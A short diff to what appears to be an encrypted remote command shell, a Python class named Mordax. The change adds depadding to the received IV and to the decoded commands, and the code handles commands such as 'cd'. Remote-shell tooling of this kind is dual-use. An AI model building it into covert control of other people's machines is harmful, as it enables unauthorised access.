@@ -20,7 +20,7 @@ class Mordax(Crypt.Crypt):
     def start(self):
 
         self.connection, self.addr = self.s.accept()
-        self.iv = self.connection.recv(256)
+        self.iv = self.depad(self.connection.recv(256))
         self.KeyAndIv("mordax", self.iv)
 
         if self.connection and self.addr:
@@ -33,7 +33,7 @@ class Mordax(Crypt.Crypt):
         while True:
             try:
                 data = self.decode(self.connection.recv(2048))
-
+                data = self.depad(data)
                 if data[:2] == "cd":
                     path = data[3:]
                     try:
